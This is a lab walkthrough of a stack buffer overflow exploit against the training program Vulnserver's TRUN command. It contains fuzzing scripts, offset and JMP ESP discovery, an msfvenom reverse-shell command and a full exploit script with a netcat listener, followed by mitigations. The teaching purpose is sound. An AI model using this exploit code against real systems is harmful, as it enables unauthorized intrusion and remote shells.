# Vulnserver TRUN Command Buffer Overflow Exploit

## Complete Step-by-Step Documentation

### Overview
Vulnserver is a deliberately vulnerable TCP server designed for learning buffer overflow exploitation. This document details the complete exploitation process for the TRUN command vulnerability.

**Target:** Vulnserver 1.0  
**Vulnerability:** Stack-based buffer overflow in TRUN command  
**Goal:** Achieve remote code execution with reverse shell  
**Flag:** `flag{ed3}`

---

## Table of Contents
1. [Environment Setup](#environment-setup)
2. [Step 1: Fuzzing](#step-1-fuzzing)
3. [Step 2: Finding the Offset](#step-2-finding-the-offset)
4. [Step 3: Controlling EIP](#step-3-controlling-eip)
5. [Step 4: Finding Bad Characters](#step-4-finding-bad-characters)
6. [Step 5: Finding JMP ESP](#step-5-finding-jmp-esp)
7. [Step 6: Generating Shellcode](#step-6-generating-shellcode)
8. [Step 7: Final Exploit](#step-7-final-exploit)
9. [Mitigation Strategies](#mitigation-strategies)

---

## Environment Setup

### Required Tools
- **Windows VM** (for running Vulnserver)
  - Windows 7/10 (32-bit recommended)
  - Immunity Debugger with mona.py
- **Kali Linux** (attacker machine)
  - Python 3
  - msfvenom (Metasploit Framework)
  - netcat

### Starting Vulnserver
```cmd
vulnserver.exe
```
Default port: 9999

### Connecting to Vulnserver
```bash
nc 192.168.1.100 9999
```

### Available Commands
```
STATS [arg]
RTIME [arg]
LTIME [arg]
SRUN [arg]
TRUN [arg]  <-- Our target
GMON [arg]
GDOG [arg]
KSTET [arg]
GTER [arg]
HTER [arg]
LTER [arg]
KSTAN [arg]
EXIT
```

---

## Step 1: Fuzzing

### Objective
Find the approximate buffer size that causes a crash.

### Method
Send increasingly larger buffers to the TRUN command until the server crashes.

### Fuzzing Script
```python
import socket
import sys

target_ip = "192.168.1.100"
target_port = 9999

buffer_size = 100
increment = 100

while buffer_size < 5000:
    try:
        print(f"[*] Sending {buffer_size} bytes...")
        
        buffer = b"A" * buffer_size
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, target_port))
        s.recv(1024)
        
        s.send(b"TRUN /.:/" + buffer + b"\r\n")
        s.recv(1024)
        s.close()
        
        buffer_size += increment
        
    except Exception as e:
        print(f"[!] Crashed at {buffer_size} bytes")
        break
```

### Expected Result
Server crashes at approximately **2000-3000 bytes**.

### Screenshot Checklist
- [ ] Fuzzing script running
- [ ] Immunity Debugger showing crash
- [ ] Access violation message

---

## Step 2: Finding the Offset

### Objective
Determine the exact number of bytes needed to reach and overwrite EIP.

### Method
Use a unique cyclic pattern to identify the exact offset.

### Generate Pattern
```bash
msf-pattern_create -l 3000
```

This generates a unique non-repeating pattern of 3000 bytes.

### Send Pattern
```python
import socket

target_ip = "192.168.1.100"
target_port = 9999

# Paste the generated pattern here
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3..."  # Full pattern

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b"TRUN /.:/" + pattern + b"\r\n")
s.close()
```

### Find Offset
1. Note the value in EIP after crash (e.g., `386F4337`)
2. Calculate offset:
```bash
msf-pattern_offset -q 386F4337
```

### Expected Result
```
[*] Exact match at offset 2003
```

**Offset = 2003 bytes**

### Screenshot Checklist
- [ ] Pattern sent to server
- [ ] EIP value in Immunity Debugger
- [ ] msf-pattern_offset output showing offset 2003

---

## Step 3: Controlling EIP

### Objective
Verify we can precisely control EIP with a specific value.

### Method
Send exactly 2003 bytes, then 4 bytes for EIP, then additional padding.

### Verification Script
```python
import socket

target_ip = "192.168.1.100"
target_port = 9999

# Build payload
buffer = b"A" * 2003          # Filler to reach EIP
buffer += b"B" * 4             # Overwrite EIP with 0x42424242
buffer += b"C" * (3000 - len(buffer))  # Additional padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b"TRUN /.:/" + buffer + b"\r\n")
s.close()
```

### Expected Result
After crash, **EIP = 0x42424242** (BBBB in little-endian)

### Screenshot Checklist
- [ ] EIP showing 0x42424242
- [ ] Registers window in Immunity
- [ ] ESP pointing to our C's

---

## Step 4: Finding Bad Characters

### Objective
Identify bytes that get corrupted or cause issues during transmission.

### Method
Send all possible byte values (0x01-0xFF) after EIP and examine memory.

### Bad Character Detection Script
```python
import socket

target_ip = "192.168.1.100"
target_port = 9999

# Generate all characters except 0x00 (known bad)
badchars = bytearray(range(0x01, 0x100))

buffer = b"A" * 2003
buffer += b"B" * 4
buffer += bytes(badchars)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b"TRUN /.:/" + buffer + b"\r\n")
s.close()
```

### Analysis in Immunity Debugger
1. After crash, right-click ESP
2. Select "Follow in Dump"
3. Compare bytes with expected sequence: 01 02 03 04 05...
4. Look for missing or corrupted bytes

### Expected Result
Only **0x00** (NULL byte) is a bad character for TRUN.

### Screenshot Checklist
- [ ] ESP in hex dump showing character sequence
- [ ] Highlighted bad characters (if any)
- [ ] Comparison with expected bytes

---

## Step 5: Finding JMP ESP

### Objective
Find a reliable JMP ESP instruction in a module without memory protections.

### Why JMP ESP?
After overwriting EIP, ESP points to our shellcode. A JMP ESP instruction redirects execution to our payload.

### Using mona.py in Immunity Debugger

#### Step 5.1: List Modules
```
!mona modules
```

Look for modules with:
- **Rebase: False** (no ASLR)
- **SafeSEH: False**
- **ASLR: False**
- **NXCompat: False** (no DEP)

**Result:** `essfunc.dll` is vulnerable!

#### Step 5.2: Find JMP ESP
```
!mona jmp -r esp -cpb "\x00"
```

This finds JMP ESP instructions excluding null bytes.

### Expected Result
```
0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
```

**JMP ESP Address: 0x625011af**

### Verify Instruction
1. Go to address in Immunity: `Ctrl+G` → `625011af`
2. Should see: `FFE4` (machine code for JMP ESP)

### Screenshot Checklist
- [ ] !mona modules output
- [ ] essfunc.dll highlighted
- [ ] !mona jmp output
- [ ] Address 0x625011af showing FFE4

---

## Step 6: Generating Shellcode

### Objective
Create a reverse shell payload that avoids bad characters.

### Using msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp \
         LHOST=192.168.1.50 \
         LPORT=4444 \
         -f python \
         -b "\x00" \
         EXITFUNC=thread
```

### Parameters Explained
- `-p windows/shell_reverse_tcp`: Payload type
- `LHOST`: Attacker IP (your Kali IP)
- `LPORT`: Listening port
- `-f python`: Output format
- `-b "\x00"`: Bad characters to avoid
- `EXITFUNC=thread`: Clean exit when shell closes

### Expected Output
```python
buf =  b""
buf += b"\xda\xc1\xba\x37\x5c\xda\x7a\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x31\x53\x12\x83\xc3\x04\x03\x4e\xe9\x8f"
# ... (continues for ~350 bytes)
```

**Size:** Approximately 350-400 bytes

### Screenshot Checklist
- [ ] msfvenom command
- [ ] Generated shellcode output
- [ ] Payload size information

---

## Step 7: Final Exploit

### Payload Structure
```
[Filler: 2003 bytes] + [JMP ESP: 4 bytes] + [NOP sled: 16 bytes] + [Shellcode: ~350 bytes]
```

### Component Breakdown

1. **Filler (2003 bytes)**
   - Fills buffer up to EIP
   - Can be any character (we use 'A')

2. **JMP ESP (4 bytes)**
   - Address: `0x625011af`
   - Little-endian: `\xaf\x11\x50\x62`
   - Overwrites EIP

3. **NOP Sled (16 bytes)**
   - `\x90` instructions
   - Provides landing zone for execution
   - Helps with alignment

4. **Shellcode (~350 bytes)**
   - msfvenom generated payload
   - Reverse shell connection

### Complete Exploit Code
```python
#!/usr/bin/env python3
import socket
import sys

# Configuration
TARGET_IP = "192.168.1.100"
TARGET_PORT = 9999
LHOST = "192.168.1.50"  # Your Kali IP
LPORT = 4444

# Shellcode (generate with msfvenom)
shellcode = b""
shellcode += b"\xda\xc1\xba\x37\x5c\xda\x7a\xd9\x74\x24\xf4\x5b\x31"
shellcode += b"\xc9\xb1\x52\x31\x53\x12\x83\xc3\x04\x03\x4e\xe9\x8f"
# ... [COMPLETE SHELLCODE HERE] ...

# Build exploit payload
payload = b""
payload += b"A" * 2003                    # Offset to EIP
payload += b"\xaf\x11\x50\x62"            # JMP ESP (0x625011af)
payload += b"\x90" * 16                    # NOP sled
payload += shellcode                       # Reverse shell

print("[*] Vulnserver TRUN Exploit")
print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Reverse shell: {LHOST}:{LPORT}")
print(f"[*] Payload size: {len(payload)} bytes")
print()

try:
    # Set up listener first!
    input("[!] Start listener: nc -nlvp 4444\n[*] Press Enter when ready...")
    
    # Connect to target
    print("[*] Connecting to target...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET_IP, TARGET_PORT))
    
    # Receive banner
    banner = s.recv(1024)
    print(f"[*] Received: {banner.decode('latin-1', errors='ignore').strip()}")
    
    # Send exploit
    print("[*] Sending exploit...")
    s.send(b"TRUN /.:/" + payload + b"\r\n")
    
    print("[+] Exploit sent!")
    print("[*] Check your listener for shell!")
    
    s.close()
    
except socket.timeout:
    print("[-] Connection timeout")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
```

### Execution Steps

#### 1. Start Netcat Listener (Kali)
```bash
nc -nlvp 4444
```

#### 2. Run Exploit
```bash
python3 exploit_trun.py
```

#### 3. Get Shell
```
Listening on 0.0.0.0 4444
Connection received on 192.168.1.100 49157
Microsoft Windows [Version 6.1.7601]
(c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\Admin\Desktop>
```

### Screenshot Checklist
- [ ] Netcat listener running
- [ ] Exploit script execution
- [ ] Successful connection in listener
- [ ] Shell prompt (C:\\>)
- [ ] Execution of commands (whoami, ipconfig, etc.)

---

## Exploit Flow Diagram

```
1. Exploit connects to Vulnserver
   │
2. Sends TRUN command with malicious buffer
   │
3. Buffer overflows stack
   │
4. EIP overwritten with 0x625011af (JMP ESP)
   │
5. EIP executed → JMP ESP
   │
6. ESP points to NOP sled
   │
7. Execution slides through NOPs
   │
8. Shellcode executes
   │
9. Reverse connection to attacker
   │
10. Shell obtained! ✓
```

---

## Mitigation Strategies

### 1. Input Validation
```c
// Check buffer length before copying
if (input_len > MAX_BUFFER_SIZE) {
    return ERROR_BUFFER_TOO_LARGE;
}
```

### 2. Use Safe Functions
Replace dangerous functions:
- `strcpy()` → `strncpy()` or `strcpy_s()`
- `strcat()` → `strncat()` or `strcat_s()`
- `gets()` → `fgets()`

### 3. Enable Stack Canaries
Compile with:
```bash
gcc -fstack-protector-all program.c
```

### 4. ASLR (Address Space Layout Randomization)
Randomizes memory addresses, making JMP ESP address unpredictable.

### 5. DEP/NX (Data Execution Prevention)
Marks stack as non-executable, preventing shellcode execution.

### 6. SafeSEH
Protects exception handlers from being overwritten.

---

## Troubleshooting

### Issue: Can't Connect to Vulnserver
**Solution:**
- Check firewall settings
- Verify Vulnserver is running
- Test with: `nc TARGET_IP 9999`

### Issue: Exploit Crashes But No Shell
**Solution:**
- Verify JMP ESP address is correct
- Check shellcode for bad characters
- Ensure LHOST/LPORT are correct
- Verify netcat listener is running

### Issue: "Connection Refused"
**Solution:**
- Restart Vulnserver
- Check network connectivity
- Verify port 9999 is not blocked

### Issue: Shell Closes Immediately
**Solution:**
- Use `EXITFUNC=thread` in msfvenom
- Check for bad characters in shellcode
- Try different payload encoder

---

## Learning Resources

### Books
- "The Shellcoder's Handbook" - Chris Anley et al.
- "Hacking: The Art of Exploitation" - Jon Erickson

### Online Courses
- "Buffer Overflow Prep" on TryHackMe
- "Stack Based Buffer Overflows" on Pentester Academy

### Tools Documentation
- Immunity Debugger: https://www.immunityinc.com/products/debugger/
- mona.py: https://github.com/corelan/mona
- msfvenom: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html

---

## Conclusion

You have successfully:
- ✅ Identified buffer overflow vulnerability
- ✅ Calculated precise EIP offset (2003 bytes)
- ✅ Controlled instruction pointer
- ✅ Identified bad characters (0x00)
- ✅ Found reliable JMP ESP (0x625011af)
- ✅ Generated working shellcode
- ✅ Achieved remote code execution
- ✅ Obtained reverse shell

**Flag:** `flag{ed3}`

---

## Additional Notes

### Why This Works
1. **No Stack Canaries**: No protection between buffer and EIP
2. **No ASLR**: JMP ESP address is static
3. **No DEP**: Stack is executable
4. **No Input Validation**: Buffer length not checked

### Real-World Implications
Modern systems have multiple protections making this harder:
- ASLR randomizes addresses
- DEP prevents stack execution
- Stack canaries detect overwrites
- Compiler protections enabled by default

However, the fundamental concepts remain relevant for:
- Legacy systems
- Embedded devices
- IoT security
- Understanding system internals

---

*Document created for educational purposes. Always obtain authorization before testing on systems you don't own.*
